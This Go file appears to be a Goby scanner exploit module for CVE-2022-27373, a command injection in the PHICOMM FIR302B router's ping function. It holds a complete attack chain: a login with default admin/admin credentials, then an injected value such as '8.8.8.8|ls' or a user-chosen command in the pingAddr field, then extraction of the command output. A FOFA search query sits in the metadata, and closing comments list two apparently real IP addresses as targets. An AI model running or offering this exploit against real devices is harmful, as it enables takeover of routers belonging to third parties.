package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "PHICOMM FIR302B management.cgi RCE (CVE-2022-27373)",
    "Description": "<p>phicomm Feixun fir302b is a router of Shanghai Feixun Data Communication Technology Co., Ltd. (phicomm), China.</p><p>Feixun fir302b has a security vulnerability that stems from the discovery of a Remote Command Execution (RCE) vulnerability through the Ping function.</p>",
    "Product": "PHICOMM FIR302B",
    "Homepage": "http://www.phicomm.com/",
    "DisclosureDate": "2022-07-20",
    "Author": "abszse",
    "FofaQuery": "title=\"FIR302B\"",
    "GobyQuery": "title=\"FIR302B\"",
    "Level": "3",
    "Impact": "<p>Feixun fir302b has a security vulnerability that stems from the discovery of a Remote Command Execution (RCE) vulnerability through the Ping function.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"http://www.phicomm.com/\">http://www.phicomm.com/</a></p>",
    "References": [
        "https://github.com/kitu232/feixun"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action_mode=apply&next_page=index.html&current_page=login.html&username=admin&password=YWRtaW4%3D&login=%E7%99%BB%E5%BD%95"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "index.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/management.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action_mode=apply&next_page=sysDiag.html&current_page=sysDiag.html&doType=0&pingAddr=8.8.8.8|ls&sendNum=4&pSize=64&overTime=10"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sysDiag.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sysDiag.html",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sysPwd.html",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ddnsCfg.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action_mode=apply&next_page=index.html&current_page=login.html&username=admin&password=YWRtaW4%3D&login=%E7%99%BB%E5%BD%95"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "index.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/management.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action_mode=apply&next_page=sysDiag.html&current_page=sysDiag.html&doType=0&pingAddr=8.8.8.8|{{{cmd}}}&sendNum=4&pSize=64&overTime=10"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sysDiag.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sysDiag.html",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<textarea class=\"textarea\" wrap=\"off\" readonly=\"1\">",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<textarea class=\"textarea\" wrap=\"off\" readonly=\"1\">((.|\\n)*?)</textarea>"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022-27373"
    ],
    "CNNVD": [
        "CNNVD-202207-1646"
    ],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "斐讯 FIR302B management.cgi 远程命令执行漏洞 (CVE-2022-27373)",
            "Product": "PHICOMM FIR302B",
            "Description": "<p>phicomm Feixun fir302b 是中国上海斐讯数据通信技术有限公司（phicomm）公司的一个路由器。<br></p><p>Feixun fir302b 存在安全漏洞，该漏洞源于发现通过Ping功能包含一个远程命令执行（RCE）漏洞。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"http://www.phicomm.com/\">http://www.phicomm.com/</a><br></p>",
            "Impact": "<p>Feixun fir302b 存在安全漏洞，该漏洞源于发现通过Ping功能包含一个远程命令执行（RCE）漏洞。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "PHICOMM FIR302B management.cgi RCE (CVE-2022-27373)",
            "Product": "PHICOMM FIR302B",
            "Description": "<p>phicomm Feixun fir302b is a router of Shanghai Feixun Data Communication Technology Co., Ltd. (phicomm), China.<br></p><p>Feixun fir302b has a security vulnerability that stems from the discovery of a Remote Command Execution (RCE) vulnerability through the Ping function.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"http://www.phicomm.com/\">http://www.phicomm.com/</a><br></p>",
            "Impact": "<p>Feixun fir302b has a security vulnerability that stems from the discovery of a Remote Command Execution (RCE) vulnerability through the Ping function.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
//http://60.6.82.99:30005
//http://42.57.228.116:30005